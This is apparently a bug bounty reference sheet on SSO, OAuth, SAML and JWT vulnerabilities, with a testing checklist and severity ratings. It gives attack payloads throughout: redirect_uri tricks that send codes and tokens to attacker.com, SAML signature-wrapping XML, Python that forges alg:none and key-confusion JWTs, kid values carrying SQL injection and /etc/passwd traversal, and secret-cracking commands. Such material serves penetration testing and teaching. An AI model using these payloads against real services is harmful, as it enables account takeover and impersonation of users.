# SSO / OAuth / SAML / JWT Security
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## Table of Contents
1. [OAuth 2.0 Flow Overview](#1-oauth-20-flow-overview)
2. [OAuth Attack Vectors](#2-oauth-attack-vectors)
3. [SAML Vulnerabilities](#3-saml-vulnerabilities)
4. [JWT Attacks](#4-jwt-attacks)
5. [Account Takeover Scenarios](#5-account-takeover-scenarios)
6. [Testing Checklist](#6-testing-checklist)

---

## 1. OAuth 2.0 Flow Overview

```
1. User clicks "Login with Google"
2. App redirects to:
   https://google.com/oauth/authorize?
     client_id=APP_CLIENT_ID&
     redirect_uri=https://app.com/callback&
     response_type=code&
     scope=email profile&
     state=RANDOM_STATE

3. User authenticates with Google
4. Google redirects to: https://app.com/callback?code=AUTH_CODE&state=RANDOM_STATE
5. App exchanges code: POST /oauth/token {code, client_id, client_secret}
6. Authorization Server returns: {access_token: "TOKEN", token_type: "bearer"}
7. App uses access token to access user resources
```

---

## 2. OAuth Attack Vectors

### Attack 1: Open Redirect in redirect_uri

If the app registers a wildcard or subdirectory callback:
```
# Normal:
redirect_uri=https://app.com/oauth/callback

# Subdirectory allowed:
redirect_uri=https://app.com/oauth/callback/../../../evil

# Subdomain allowed:
redirect_uri=https://evil.app.com/oauth/callback

# App has open redirect:
redirect_uri=https://app.com/redirect?url=https://attacker.com

# Path traversal:
redirect_uri=https://app.com%2F@attacker.com

# @ authority confusion:
redirect_uri=https://app.com@attacker.com/callback

# Subdomain confusion:
redirect_uri=https://app.com.attacker.com/callback

# Double URL encoding:
redirect_uri=https://app.com%252F.attacker.com/callback
```

If auth code is redirected to attacker's URL → attacker exchanges code for access token → account takeover.

### Attack 2: Missing/Weak state Parameter (CSRF on OAuth)

```
# Attack: CSRF-bind victim to attacker's account
1. Attacker initiates OAuth flow but doesn't complete authorization
2. Captures: https://app.com/callback?code=ATTACKER_CODE&state=X
3. Tricks victim into visiting this URL (via img src, link, CSRF PoC)
4. Victim's session is now linked to attacker's OAuth account
```

Real-world: **Slack** ($3,000+): Missing OAuth state → CSRF → attacker account linked to victim's Slack workspace

### Attack 3: Authorization Code Interception via Referer

```
# If callback page loads external resources (analytics, fonts, CDN):
GET https://app.com/callback?code=AUTH_CODE&state=X
# Page loads: <img src="https://analytics.com/track"> → Referer: https://app.com/callback?code=AUTH_CODE
# Auth code leaked to analytics server logs
```

### Attack 4: Token Leakage via Fragment (Implicit Flow)

```
# Implicit flow: access_token appears in URL fragment
# https://app.com/callback#access_token=TOKEN&token_type=bearer
# Fragment accessible to JavaScript on that page

# Exploit: if redirect_uri includes open redirect → token in fragment goes to attacker
redirect_uri=https://attacker.com → https://attacker.com#access_token=TOKEN
```

### Attack 5: Scope Escalation

```
# Request more scopes than granted
# Change during token request: scope=read → scope=read,write,admin
# Client-side scope display vs. server-side validation discrepancy
```

### Attack 6: OAuth Token Theft via Open Redirect

```
Step 1: Find open redirect on client domain: https://client.com/redirect?url=https://attacker.com
Step 2: Use as redirect_uri:
  /oauth/authorize?...&redirect_uri=https://client.com/redirect?url=https://attacker.com
Step 3: Authorization code/token gets sent to attacker.com

Real-world: HackerOne ($1,000): Open redirect → OAuth token theft
Real-world: Microsoft ($7,500): Open redirect in redirect_uri → steal access tokens
```

### Attack 7: HPP on redirect_uri

```
# Duplicate redirect_uri — OAuth server validates first, app uses second:
GET /oauth/authorize?
  client_id=LEGITIMATE_APP&
  redirect_uri=https://app.com/callback&
  redirect_uri=https://attacker.com/steal&
  scope=read&response_type=code
```

### Attack 8: Subdomain Takeover for OAuth Token Theft

```
1. Find subdomain takeover on old.app.com
2. Register redirect_uri=https://old.app.com/callback with OAuth provider
3. If provider allows *.app.com redirects → auth codes go to attacker server
```

---

## 3. SAML Vulnerabilities

### SAML Flow
SAML assertions are XML-signed. Service Provider validates signature and grants access.

### XML Signature Wrapping (XSW) Attack

```xml
<!-- Legitimate signed assertion -->
<samlp:Response>
  <Assertion ID="1">
    <Subject><NameID>legit_user</NameID></Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- Wrapping attack: inject unsigned assertion BEFORE signed one -->
<samlp:Response>
  <Assertion ID="2">                      ← unsigned injection
    <Subject><NameID>admin</NameID></Subject>
  </Assertion>
  <Assertion ID="1">                      ← signed (still validates)
    <Subject><NameID>legit_user</NameID></Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>
<!-- If app uses FIRST assertion for auth → admin access! -->
```

**Testing with SAML Raider (Burp Extension)**:
1. Intercept SAML response in Burp
2. SAML Raider decodes base64
3. Try XSW (XML Signature Wrapping) attacks (8 variants built-in)
4. Try editing the NameID to another user's email
5. Try stripping the Signature element entirely

### SAML NameID Manipulation

```
# If signature not properly validated:
# Change NameID from your email to admin email
<NameID>admin@example.com</NameID>

# Test: Remove signature, change NameID, base64-encode, resubmit
```

### SAML Comment Injection

```xml
<!-- Some parsers confused by XML comments in values: -->
<NameID>attacker@evil.com<!---->@legitimate.com</NameID>
<!-- Some parsers read "attacker@evil.com" as the NameID -->
```

### Severity: CRITICAL
SAML signature bypass → admin impersonation on any SAML-based SSO

---

## 4. JWT Attacks

### JWT Structure
```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SflK...

Decode header:  {"alg": "HS256", "typ": "JWT"}
Decode payload: {"sub": "1234", "role": "user"}
```

### Attack 1: alg:none (No Signature Verification)

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload}."   # Empty signature
```

### Attack 2: RS256 → HS256 Algorithm Confusion

```python
# Server uses RS256 (asymmetric). Public key is known/obtainable.
# Change algorithm to HS256, sign with the PUBLIC KEY as HMAC secret.
# Server verifies: uses public key as HS256 secret → accepts forged token!

# python-jwt:
import jwt
public_key = "-----BEGIN PUBLIC KEY-----\n..."
token = jwt.encode({"user":"admin","role":"admin"}, public_key, algorithm="HS256")

# jwt_tool:
python3 jwt_tool.py -t <token> -X k -pk public.pem
```

### Attack 3: Weak Secret Brute Force

```bash
# hashcat
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
# john the ripper
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt_hash.txt
# jwt_tool
python3 jwt_tool.py -t <token> -C -d /opt/SecLists/Passwords/rockyou.txt
```

### Attack 4: kid (Key ID) Parameter Injection

The `kid` header specifies which key to use for verification.

```json
// If kid is used in SQL query to look up key:
{"alg": "HS256", "kid": "' UNION SELECT 'attacker_secret' -- "}
// Sign token with 'attacker_secret' as HMAC key — server will verify with it

// If kid is a file path:
{"alg": "HS256", "kid": "../../dev/null"}
// Sign with empty string (contents of /dev/null)
{"alg": "HS256", "kid": "/dev/null"}
{"alg": "HS256", "kid": "../../etc/passwd"}
// Sign with the contents of /etc/passwd as HMAC key
```

### Attack 5: JWK Header Injection

```json
// Embed your OWN public key in the header
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker_public_key_modulus>",
    "e": "AQAB"
  }
}
// Sign with attacker's PRIVATE key, embed PUBLIC key in header
// Vulnerable server uses embedded JWK to verify → accepts forged token!
```

### Attack 6: x5c Header Injection (Similar to JWK)

Embed a self-signed certificate chain in the `x5c` header.

### JWT Tool — All-in-One

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool.git

# Decode and inspect JWT
python3 jwt_tool.py TOKEN

# Test alg:none
python3 jwt_tool.py TOKEN -X a

# Test HS256 with public key (RS256→HS256 confusion)
python3 jwt_tool.py TOKEN -X k -pk public.pem

# Test JWK header injection
python3 jwt_tool.py TOKEN -X i

# Test x5c header injection
python3 jwt_tool.py TOKEN -X s

# kid injection
python3 jwt_tool.py TOKEN -X b

# Modify a claim (interactive)
python3 jwt_tool.py TOKEN -I -pc role -pv admin

# Brute force secret
python3 jwt_tool.py TOKEN -C -d /opt/SecLists/Passwords/rockyou.txt
```

---

## 5. Account Takeover Scenarios

### Pre-login Account Linking Attack
```
1. Create account on target with email victim@example.com (register normally if possible)
2. Link attacker-controlled Google/Facebook OAuth account to it
3. If site allows linking without re-verification:
   - Future OAuth logins with attacker's Google bypass victim's password
```

### OAuth CSRF (Account Merge Attack)
```
1. Attacker starts OAuth flow on target site (using Google)
2. Copies the partial URL: https://target.com/callback?code=CODE&state=STATE
3. Tricks victim (already logged in to target) into visiting that URL
4. Target site merges attacker's Google account with victim's existing account
5. Attacker can now log in as victim via Google OAuth
```

---

## 6. Testing Checklist

- [ ] Map full OAuth flow (client_id, redirect_uri, state, scope, response_type)
- [ ] Test CSRF: missing/weak/static state parameter
- [ ] Test redirect_uri: path traversal, subdomain confusion, open redirect chaining, HPP
- [ ] Check token leakage via Referer (external resources on callback page)
- [ ] Test implicit flow token in fragment leakage
- [ ] Test scope escalation (request broader scopes)
- [ ] Test subdomain takeover → OAuth redirect
- [ ] Test SAML if used: SAML Raider → XSW attacks, NameID manipulation, signature stripping
- [ ] Test JWT: alg:none, RS256→HS256, brute-force secret, kid injection, JWK header injection
- [ ] Check for "login with X" + unverified email account creation

## Severity
- **Critical**: SAML signature bypass → admin impersonation
- **Critical**: JWT JWK header injection → arbitrary user impersonation
- **Critical**: JWT alg:none accepted → auth bypass
- **High**: OAuth CSRF (account linking/takeover)
- **High**: OAuth token theft via open redirect in redirect_uri
- **High**: JWT RS256→HS256 confusion → arbitrary token forge
- **High**: JWT weak secret cracked → arbitrary token forge
